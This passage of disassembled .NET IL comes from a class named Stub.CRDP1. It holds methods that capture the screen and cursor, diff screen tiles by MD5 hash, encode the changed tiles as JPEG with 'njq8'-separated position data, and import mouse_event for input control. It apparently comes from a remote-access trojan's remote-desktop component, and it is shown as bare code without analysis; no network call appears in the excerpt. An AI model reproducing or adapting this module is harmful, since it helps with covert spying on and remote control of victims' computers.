    IL_0331:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0336:  nop
    IL_0337:  ldloc.s    V_27
    IL_0339:  call       string Stub.CRDP1::md5(uint8[])
    IL_033e:  ldloc.s    V_29
    IL_0340:  call       string Stub.CRDP1::md5(uint8[])
    IL_0345:  ldc.i4.0
    IL_0346:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_034b:  ldc.i4.0
    IL_034c:  ceq
    IL_034e:  stloc.s    V_44
    IL_0350:  ldloc.s    V_44
    IL_0352:  brfalse.s  IL_035e

    IL_0354:  ldloc.s    V_30
    IL_0356:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
    IL_035b:  nop
    IL_035c:  br.s       IL_037f

    IL_035e:  nop
    IL_035f:  ldloc.s    V_8
    IL_0361:  ldloc.s    V_30
    IL_0363:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::Add(!0)
    IL_0368:  nop
    IL_0369:  ldloca.s   V_15
    IL_036b:  ldloc.s    V_36
    IL_036d:  ldloc.s    V_31
    IL_036f:  call       instance void [System.Drawing]System.Drawing.Point::.ctor(int32,
                                                                                   int32)
    IL_0374:  nop
    IL_0375:  ldloc.s    V_9
    IL_0377:  ldloc.s    V_15
    IL_0379:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::Add(!0)
    IL_037e:  nop
    IL_037f:  nop
    IL_0380:  ldloc.s    V_28
    IL_0382:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
    IL_0387:  nop
    IL_0388:  ldloc.s    V_25
    IL_038a:  ldc.i4.1
    IL_038b:  add.ovf
    IL_038c:  stloc.s    V_25
    IL_038e:  nop
    IL_038f:  ldloc.s    V_25
    IL_0391:  ldloc.s    V_26
    IL_0393:  cgt
    IL_0395:  ldc.i4.0
    IL_0396:  ceq
    IL_0398:  stloc.s    V_44
    IL_039a:  ldloc.s    V_44
    IL_039c:  brtrue     IL_01e2

    IL_03a1:  ldloc.s    V_21
    IL_03a3:  ldc.i4.1
    IL_03a4:  add.ovf
    IL_03a5:  stloc.s    V_21
    IL_03a7:  nop
    IL_03a8:  ldloc.s    V_21
    IL_03aa:  ldloc.s    V_23
    IL_03ac:  cgt
    IL_03ae:  ldc.i4.0
    IL_03af:  ceq
    IL_03b1:  stloc.s    V_44
    IL_03b3:  ldloc.s    V_44
    IL_03b5:  brtrue     IL_01d5

    IL_03ba:  nop
    IL_03bb:  ldloc.s    V_8
    IL_03bd:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::get_Count()
    IL_03c2:  ldc.i4.0
    IL_03c3:  ceq
    IL_03c5:  stloc.s    V_44
    IL_03c7:  ldloc.s    V_44
    IL_03c9:  brfalse.s  IL_03e0

    IL_03cb:  ldc.i4.1
    IL_03cc:  newarr     [mscorlib]System.Byte
    IL_03d1:  stloc.s    V_42
    IL_03d3:  ldloc.s    V_42
    IL_03d5:  ldc.i4.0
    IL_03d6:  ldc.i4.0
    IL_03d7:  stelem.i1
    IL_03d8:  ldloc.s    V_42
    IL_03da:  stloc.0
    IL_03db:  br         IL_0689

    IL_03e0:  nop
    IL_03e1:  ldc.i4.0
    IL_03e2:  stloc.s    V_4
    IL_03e4:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<int32>::.ctor()
    IL_03e9:  stloc.s    V_10
    IL_03eb:  ldarg.1
    IL_03ec:  ldarg.1
    IL_03ed:  mul.ovf
    IL_03ee:  conv.r8
    IL_03ef:  ldc.r8     5.
    IL_03f8:  div
    IL_03f9:  conv.r8
    IL_03fa:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_03ff:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0404:  conv.ovf.i4
    IL_0405:  stloc.s    V_12
    IL_0407:  ldc.i4.0
    IL_0408:  stloc.s    V_5
    IL_040a:  br.s       IL_0445

    IL_040c:  ldloc.s    V_5
    IL_040e:  ldloc.s    V_8
    IL_0410:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::get_Count()
    IL_0415:  ceq
    IL_0417:  stloc.s    V_44
    IL_0419:  ldloc.s    V_44
    IL_041b:  brfalse.s  IL_0420

    IL_041d:  nop
    IL_041e:  br.s       IL_0454

    IL_0420:  nop
    IL_0421:  ldloc.s    V_10
    IL_0423:  ldloc.s    V_5
    IL_0425:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<int32>::Add(!0)
    IL_042a:  nop
    IL_042b:  ldloc.s    V_4
    IL_042d:  ldloc.s    V_8
    IL_042f:  ldloc.s    V_5
    IL_0431:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::get_Item(int32)
    IL_0436:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
    IL_043b:  add.ovf
    IL_043c:  stloc.s    V_4
    IL_043e:  ldloc.s    V_5
    IL_0440:  ldc.i4.1
    IL_0441:  add.ovf
    IL_0442:  stloc.s    V_5
    IL_0444:  nop
    IL_0445:  ldloc.s    V_5
    IL_0447:  ldloc.s    V_12
    IL_0449:  cgt
    IL_044b:  ldc.i4.0
    IL_044c:  ceq
    IL_044e:  stloc.s    V_44
    IL_0450:  ldloc.s    V_44
    IL_0452:  brtrue.s   IL_040c

    IL_0454:  ldloc.s    V_8
    IL_0456:  ldc.i4.0
    IL_0457:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::get_Item(int32)
    IL_045c:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
    IL_0461:  ldloc.s    V_4
    IL_0463:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                    int32)
    IL_0468:  stloc.s    V_6
    IL_046a:  ldloc.s    V_6
    IL_046c:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
    IL_0471:  stloc.3
    IL_0472:  ldc.i4.0
    IL_0473:  stloc.s    V_20
    IL_0475:  ldloc.s    V_14
    IL_0477:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
    IL_047c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
    IL_0481:  ldstr      "."
    IL_0486:  ldloc.s    V_14
    IL_0488:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
    IL_048d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
    IL_0492:  ldstr      ","
    IL_0497:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string,
                                                                string)
    IL_049c:  stloc.s    V_16
    IL_049e:  nop
    .try
    {
      IL_049f:  ldloc.s    V_10
      IL_04a1:  callvirt   instance valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<!0> class [mscorlib]System.Collections.Generic.List`1<int32>::GetEnumerator()
      IL_04a6:  stloc.s    V_43
      IL_04a8:  br         IL_0563

      IL_04ad:  ldloca.s   V_43
      IL_04af:  call       instance !0 valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<int32>::get_Current()
      IL_04b4:  stloc.s    V_11
      IL_04b6:  ldc.i4.7
      IL_04b7:  newarr     [mscorlib]System.String
      IL_04bc:  stloc.s    V_38
      IL_04be:  ldloc.s    V_38
      IL_04c0:  ldc.i4.0
      IL_04c1:  ldloc.s    V_16
      IL_04c3:  stelem.ref
      IL_04c4:  nop
      IL_04c5:  ldloc.s    V_9
      IL_04c7:  ldloc.s    V_11
      IL_04c9:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::get_Item(int32)
      IL_04ce:  stloc.s    V_37
      IL_04d0:  ldloc.s    V_38
      IL_04d2:  ldc.i4.1
      IL_04d3:  ldloca.s   V_37
      IL_04d5:  call       instance int32 [System.Drawing]System.Drawing.Point::get_X()
      IL_04da:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_04df:  stelem.ref
      IL_04e0:  nop
      IL_04e1:  ldloc.s    V_38
      IL_04e3:  ldc.i4.2
      IL_04e4:  ldstr      "."
      IL_04e9:  stelem.ref
      IL_04ea:  nop
      IL_04eb:  ldloc.s    V_9
      IL_04ed:  ldloc.s    V_11
      IL_04ef:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::get_Item(int32)
      IL_04f4:  stloc.s    V_15
      IL_04f6:  ldloc.s    V_38
      IL_04f8:  ldc.i4.3
      IL_04f9:  ldloca.s   V_15
      IL_04fb:  call       instance int32 [System.Drawing]System.Drawing.Point::get_Y()
      IL_0500:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_0505:  stelem.ref
      IL_0506:  nop
      IL_0507:  ldloc.s    V_38
      IL_0509:  ldc.i4.4
      IL_050a:  ldstr      "."
      IL_050f:  stelem.ref
      IL_0510:  nop
      IL_0511:  ldloc.s    V_38
      IL_0513:  ldc.i4.5
      IL_0514:  ldloc.s    V_8
      IL_0516:  ldloc.s    V_11
      IL_0518:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::get_Item(int32)
      IL_051d:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_0522:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_0527:  stelem.ref
      IL_0528:  nop
      IL_0529:  ldloc.s    V_38
      IL_052b:  ldc.i4.6
      IL_052c:  ldstr      ","
      IL_0531:  stelem.ref
      IL_0532:  nop
      IL_0533:  ldloc.s    V_38
      IL_0535:  call       string [mscorlib]System.String::Concat(string[])
      IL_053a:  stloc.s    V_16
      IL_053c:  ldloc.3
      IL_053d:  ldloc.s    V_8
      IL_053f:  ldloc.s    V_11
      IL_0541:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::get_Item(int32)
      IL_0546:  ldc.i4.0
      IL_0547:  ldloc.s    V_20
      IL_0549:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::DrawImage(class [System.Drawing]System.Drawing.Image,
                                                                                            int32,
                                                                                            int32)
      IL_054e:  nop
      IL_054f:  ldloc.s    V_20
      IL_0551:  ldloc.s    V_8
      IL_0553:  ldloc.s    V_11
      IL_0555:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::get_Item(int32)
      IL_055a:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_055f:  add.ovf
      IL_0560:  stloc.s    V_20
      IL_0562:  nop
      IL_0563:  ldloca.s   V_43
      IL_0565:  call       instance bool valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<int32>::MoveNext()
      IL_056a:  stloc.s    V_44
      IL_056c:  ldloc.s    V_44
      IL_056e:  brtrue     IL_04ad

      IL_0573:  nop
      IL_0574:  leave.s    IL_0585

    }  // end .try
    finally
    {
      IL_0576:  ldloca.s   V_43
      IL_0578:  constrained. valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<int32>
      IL_057e:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0583:  nop
      IL_0584:  endfinally
    }  // end handler
    IL_0585:  ldloc.s    V_16
    IL_0587:  ldstr      "njq8"
    IL_058c:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0591:  stloc.s    V_16
    IL_0593:  ldloc.s    V_8
    IL_0595:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::get_Count()
    IL_059a:  ldc.i4.1
    IL_059b:  sub.ovf
    IL_059c:  stloc.s    V_13
    IL_059e:  ldc.i4.0
    IL_059f:  stloc.s    V_7
    IL_05a1:  br.s       IL_05e5

    IL_05a3:  ldloc.s    V_10
    IL_05a5:  ldloc.s    V_7
    IL_05a7:  callvirt   instance bool class [mscorlib]System.Collections.Generic.List`1<int32>::Contains(!0)
    IL_05ac:  ldc.i4.0
    IL_05ad:  ceq
    IL_05af:  stloc.s    V_44
    IL_05b1:  ldloc.s    V_44
    IL_05b3:  brfalse.s  IL_05dd

    IL_05b5:  ldsfld     class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap> Stub.CRDP1::OA
    IL_05ba:  ldloc.s    V_8
    IL_05bc:  ldloc.s    V_7
    IL_05be:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::get_Item(int32)
    IL_05c3:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::Add(!0)
    IL_05c8:  nop
    IL_05c9:  ldsfld     class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point> Stub.CRDP1::OAA
    IL_05ce:  ldloc.s    V_9
    IL_05d0:  ldloc.s    V_7
    IL_05d2:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::get_Item(int32)
    IL_05d7:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::Add(!0)
    IL_05dc:  nop
    IL_05dd:  nop
    IL_05de:  ldloc.s    V_7
    IL_05e0:  ldc.i4.1
    IL_05e1:  add.ovf
    IL_05e2:  stloc.s    V_7
    IL_05e4:  nop
    IL_05e5:  ldloc.s    V_7
    IL_05e7:  ldloc.s    V_13
    IL_05e9:  cgt
    IL_05eb:  ldc.i4.0
    IL_05ec:  ceq
    IL_05ee:  stloc.s    V_44
    IL_05f0:  ldloc.s    V_44
    IL_05f2:  brtrue.s   IL_05a3

    IL_05f4:  ldloc.3
    IL_05f5:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
    IL_05fa:  nop
    IL_05fb:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_0600:  stloc.s    V_19
    IL_0602:  ldc.i4.1
    IL_0603:  newobj     instance void [System.Drawing]System.Drawing.Imaging.EncoderParameters::.ctor(int32)
    IL_0608:  stloc.2
    IL_0609:  ldloc.2
    IL_060a:  callvirt   instance class [System.Drawing]System.Drawing.Imaging.EncoderParameter[] [System.Drawing]System.Drawing.Imaging.EncoderParameters::get_Param()
    IL_060f:  ldc.i4.0
    IL_0610:  ldsfld     class [System.Drawing]System.Drawing.Imaging.Encoder [System.Drawing]System.Drawing.Imaging.Encoder::Quality
    IL_0615:  ldarg.2
    IL_0616:  conv.i8
    IL_0617:  newobj     instance void [System.Drawing]System.Drawing.Imaging.EncoderParameter::.ctor(class [System.Drawing]System.Drawing.Imaging.Encoder,
                                                                                                      int64)
    IL_061c:  stelem.ref
    IL_061d:  nop
    IL_061e:  ldstr      "image/jpeg"
    IL_0623:  call       class [System.Drawing]System.Drawing.Imaging.ImageCodecInfo Stub.CRDP1::GetEncoderInfo(string)
    IL_0628:  stloc.1
    IL_0629:  ldloc.s    V_6
    IL_062b:  ldloc.s    V_19
    IL_062d:  ldloc.1
    IL_062e:  ldloc.2
    IL_062f:  callvirt   instance void [System.Drawing]System.Drawing.Image::Save(class [mscorlib]System.IO.Stream,
                                                                                  class [System.Drawing]System.Drawing.Imaging.ImageCodecInfo,
                                                                                  class [System.Drawing]System.Drawing.Imaging.EncoderParameters)
    IL_0634:  nop
    IL_0635:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_063a:  stloc.s    V_18
    IL_063c:  ldloc.s    V_18
    IL_063e:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_Default()
    IL_0643:  ldloc.s    V_16
    IL_0645:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_064a:  ldc.i4.0
    IL_064b:  ldloc.s    V_16
    IL_064d:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0652:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
    IL_0657:  nop
    IL_0658:  ldloc.s    V_18
    IL_065a:  ldloc.s    V_19
    IL_065c:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
    IL_0661:  ldc.i4.0
    IL_0662:  ldloc.s    V_19
    IL_0664:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
    IL_0669:  conv.ovf.i4
    IL_066a:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
    IL_066f:  nop
    IL_0670:  ldloc.s    V_14
    IL_0672:  stsfld     class [System.Drawing]System.Drawing.Bitmap Stub.CRDP1::OM
    IL_0677:  ldloc.s    V_6
    IL_0679:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
    IL_067e:  nop
    IL_067f:  ldloc.s    V_18
    IL_0681:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
    IL_0686:  stloc.0
    IL_0687:  br.s       IL_0689

    IL_0689:  ldloc.0
    IL_068a:  ret
  } // end of method CRDP1::Cap

  .method public static void  Clear() cil managed
  {
    // Code size       33 (0x21)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldc.i4.m1
    IL_0002:  stsfld     int32 Stub.CRDP1::oQ
    IL_0007:  ldc.i4.m1
    IL_0008:  stsfld     int32 Stub.CRDP1::oCo
    IL_000d:  ldc.i4.m1
    IL_000e:  stsfld     int32 Stub.CRDP1::oQu
    IL_0013:  ldc.i4.1
    IL_0014:  ldc.i4.1
    IL_0015:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                    int32)
    IL_001a:  stsfld     class [System.Drawing]System.Drawing.Bitmap Stub.CRDP1::OM
    IL_001f:  nop
    IL_0020:  ret
  } // end of method CRDP1::Clear

  .method private static class [System.Drawing]System.Drawing.Image 
          Gd([opt] int32 Wi,
             [opt] int32 He,
             [opt] bool Sh) cil managed
  {
    .param [1] = int32(0x00000000)
    .param [2] = int32(0x00000000)
    .param [3] = bool(true)
    // Code size       262 (0x106)
    .maxstack  7
    .locals init (valuetype [System.Drawing]System.Drawing.Size V_0,
             valuetype [System.Drawing]System.Drawing.Rectangle V_1,
             class [System.Drawing]System.Drawing.Graphics V_2,
             class [System.Drawing]System.Drawing.Image V_3,
             int32 V_4,
             class [System.Drawing]System.Drawing.Bitmap V_5,
             native int V_6,
             int32 V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             valuetype [System.Drawing]System.Drawing.Rectangle V_10,
             bool V_11)
    IL_0000:  nop
    IL_0001:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
    IL_0006:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
    IL_000b:  stloc.s    V_10
    IL_000d:  ldloca.s   V_10
    IL_000f:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
    IL_0014:  stloc.s    V_7
    IL_0016:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
    IL_001b:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
    IL_0020:  stloc.s    V_10
    IL_0022:  ldloca.s   V_10
    IL_0024:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
    IL_0029:  stloc.s    V_4
    IL_002b:  ldloc.s    V_7
    IL_002d:  ldloc.s    V_4
    IL_002f:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                    int32)
    IL_0034:  stloc.s    V_5
    IL_0036:  ldloc.s    V_5
    IL_0038:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
    IL_003d:  stloc.2
    IL_003e:  ldloc.2
    IL_003f:  ldc.i4.1
    IL_0040:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::set_CompositingQuality(valuetype [System.Drawing]System.Drawing.Drawing2D.CompositingQuality)
    IL_0045:  nop
    IL_0046:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
    IL_004b:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
    IL_0050:  stloc.1
    IL_0051:  ldloca.s   V_0
    IL_0053:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
    IL_0058:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
    IL_005d:  stloc.s    V_10
    IL_005f:  ldloca.s   V_10
    IL_0061:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
    IL_0066:  ldloca.s   V_1
    IL_0068:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
    IL_006d:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                  int32)
    IL_0072:  nop
    IL_0073:  ldloc.2
    IL_0074:  ldc.i4.0
    IL_0075:  ldc.i4.0
    IL_0076:  ldc.i4.0
    IL_0077:  ldc.i4.0
    IL_0078:  ldloc.0
    IL_0079:  ldc.i4     0xcc0020
    IL_007e:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::CopyFromScreen(int32,
                                                                                               int32,
                                                                                               int32,
                                                                                               int32,
                                                                                               valuetype [System.Drawing]System.Drawing.Size,
                                                                                               valuetype [System.Drawing]System.Drawing.CopyPixelOperation)
    IL_0083:  nop
    IL_0084:  ldarg.2
    IL_0085:  stloc.s    V_11
    IL_0087:  ldloc.s    V_11
    IL_0089:  brfalse.s  IL_00d8

    IL_008b:  nop
    .try
    {
      IL_008c:  ldloca.s   V_0
      IL_008e:  ldc.i4.s   32
      IL_0090:  ldc.i4.s   32
      IL_0092:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                    int32)
      IL_0097:  nop
      IL_0098:  ldloca.s   V_1
      IL_009a:  call       valuetype [System.Drawing]System.Drawing.Point [System.Windows.Forms]System.Windows.Forms.Cursor::get_Position()
      IL_009f:  ldloc.0
      IL_00a0:  call       instance void [System.Drawing]System.Drawing.Rectangle::.ctor(valuetype [System.Drawing]System.Drawing.Point,
                                                                                         valuetype [System.Drawing]System.Drawing.Size)
      IL_00a5:  nop
      IL_00a6:  call       class [System.Windows.Forms]System.Windows.Forms.Cursor [System.Windows.Forms]System.Windows.Forms.Cursors::get_Default()
      IL_00ab:  ldloc.2
      IL_00ac:  ldloc.1
      IL_00ad:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Cursor::Draw(class [System.Drawing]System.Drawing.Graphics,
                                                                                                 valuetype [System.Drawing]System.Drawing.Rectangle)
      IL_00b2:  nop
      IL_00b3:  leave.s    IL_00d7

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00b5:  dup
      IL_00b6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00bb:  stloc.s    V_9
      IL_00bd:  nop
      IL_00be:  ldloc.s    V_9
      IL_00c0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c5:  nop
      IL_00c6:  ldloc.s    V_9
      IL_00c8:  stloc.s    V_8
      IL_00ca:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00cf:  nop
      IL_00d0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d5:  leave.s    IL_00d7

    }  // end handler
    IL_00d7:  nop
    IL_00d8:  nop
    IL_00d9:  ldloc.2
    IL_00da:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
    IL_00df:  nop
    IL_00e0:  ldarg.0
    IL_00e1:  ldc.i4.0
    IL_00e2:  ceq
    IL_00e4:  ldarg.1
    IL_00e5:  ldc.i4.0
    IL_00e6:  ceq
    IL_00e8:  and
    IL_00e9:  stloc.s    V_11
    IL_00eb:  ldloc.s    V_11
    IL_00ed:  brfalse.s  IL_00f4

    IL_00ef:  ldloc.s    V_5
    IL_00f1:  stloc.3
    IL_00f2:  br.s       IL_0104

    IL_00f4:  nop
    IL_00f5:  ldloc.s    V_5
    IL_00f7:  ldarg.0
    IL_00f8:  ldarg.1
    IL_00f9:  ldnull
    IL_00fa:  ldloc.s    V_6
    IL_00fc:  callvirt   instance class [System.Drawing]System.Drawing.Image [System.Drawing]System.Drawing.Image::GetThumbnailImage(int32,
                                                                                                                                     int32,
                                                                                                                                     class [System.Drawing]System.Drawing.Image/GetThumbnailImageAbort,
                                                                                                                                     native int)
    IL_0101:  stloc.3
    IL_0102:  br.s       IL_0104

    IL_0104:  ldloc.3
    IL_0105:  ret
  } // end of method CRDP1::Gd

  .method private static class [System.Drawing]System.Drawing.Imaging.ImageCodecInfo 
          GetEncoderInfo(string M) cil managed
  {
    // Code size       70 (0x46)
    .maxstack  3
    .locals init (class [System.Drawing]System.Drawing.Imaging.ImageCodecInfo V_0,
             int32 V_1,
             class [System.Drawing]System.Drawing.Imaging.ImageCodecInfo[] V_2,
             int32 V_3,
             bool V_4)
    IL_0000:  nop
    IL_0001:  call       class [System.Drawing]System.Drawing.Imaging.ImageCodecInfo[] [System.Drawing]System.Drawing.Imaging.ImageCodecInfo::GetImageEncoders()
    IL_0006:  stloc.2
    IL_0007:  ldloc.2
    IL_0008:  ldlen
    IL_0009:  conv.ovf.i4
    IL_000a:  stloc.3
    IL_000b:  ldc.i4.0
    IL_000c:  stloc.1
    IL_000d:  br.s       IL_0033

    IL_000f:  ldloc.2
    IL_0010:  ldloc.1
    IL_0011:  ldelem.ref
    IL_0012:  callvirt   instance string [System.Drawing]System.Drawing.Imaging.ImageCodecInfo::get_MimeType()
    IL_0017:  ldarg.0
    IL_0018:  ldc.i4.0
    IL_0019:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_001e:  ldc.i4.0
    IL_001f:  ceq
    IL_0021:  stloc.s    V_4
    IL_0023:  ldloc.s    V_4
    IL_0025:  brfalse.s  IL_002d

    IL_0027:  ldloc.2
    IL_0028:  ldloc.1
    IL_0029:  ldelem.ref
    IL_002a:  stloc.0
    IL_002b:  br.s       IL_0044

    IL_002d:  nop
    IL_002e:  ldloc.1
    IL_002f:  ldc.i4.1
    IL_0030:  add.ovf
    IL_0031:  stloc.1
    IL_0032:  nop
    IL_0033:  ldloc.1
    IL_0034:  ldloc.3
    IL_0035:  cgt
    IL_0037:  ldc.i4.0
    IL_0038:  ceq
    IL_003a:  stloc.s    V_4
    IL_003c:  ldloc.s    V_4
    IL_003e:  brtrue.s   IL_000f

    IL_0040:  ldnull
    IL_0041:  stloc.0
    IL_0042:  br.s       IL_0044

    IL_0044:  ldloc.0
    IL_0045:  ret
  } // end of method CRDP1::GetEncoderInfo

  .method private static string  md5(uint8[] bB) cil managed
  {
    // Code size       25 (0x19)
    .maxstack  2
    .locals init (string V_0)
    IL_0000:  nop
    IL_0001:  newobj     instance void [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
    IL_000c:  starg.s    bB
    IL_000e:  ldarg.0
    IL_000f:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
    IL_0014:  stloc.0
    IL_0015:  br.s       IL_0017

    IL_0017:  ldloc.0
    IL_0018:  ret
  } // end of method CRDP1::md5

  .method public static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          void  mouse_event(int32 dwFlags,
                            int32 dx,
                            int32 dy,
                            int32 cButtons,
                            int32 dwExtraInfo) cil managed preservesig
  {
  }
  .method private static valuetype [System.Drawing]System.Drawing.Size 
          QZ(int32 q) cil managed
  {
    // Code size       1405 (0x57d)
    .maxstack  5
    .locals init (valuetype [System.Drawing]System.Drawing.Size V_0,
             valuetype [System.Drawing]System.Drawing.Size V_1,
             valuetype [System.Drawing]System.Drawing.Rectangle V_2,
             valuetype [System.Drawing]System.Drawing.Rectangle V_3,
             int32 V_4,
             int32 V_5,
             int32 V_6,
             int32 V_7)
    IL_0000:  nop
    IL_0001:  ldloca.s   V_1
    IL_0003:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
    IL_0008:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
    IL_000d:  stloc.2
    IL_000e:  ldloca.s   V_2
    IL_0010:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
